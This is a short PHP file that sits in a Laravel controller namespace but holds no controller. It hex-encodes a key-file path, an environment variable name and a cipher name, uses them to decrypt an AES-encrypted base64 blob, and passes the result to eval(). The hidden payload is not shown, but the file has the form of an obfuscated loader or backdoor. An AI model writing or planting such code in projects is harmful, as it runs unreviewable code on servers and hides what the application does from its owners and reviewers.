<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Sr0ly7d8C99bISb/hL/vug==');

$c=base64_decode(

'7RvGRBNzUn72TzagcKcANKFWrRl5iAHpRfZIiQbwl/kZqHRQ3Q+VSQ4d3/wDybXmw7mSeni/xLVA' .
'qCL5I7/ItHUYuL6JriLV3dAKypUN7XRuZvnZ2OIJSXmCaa7f7cjlFSwm2mLPlkGo0kY3OIVP0BXX' .
'HypPLu7z5/Wk935rnDs1QicumQTom4s14pH7kTG0T8pg5CHFAqd/t9WdOBecs9Y8tMYaZTETVBlI' .
'j5gncwA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

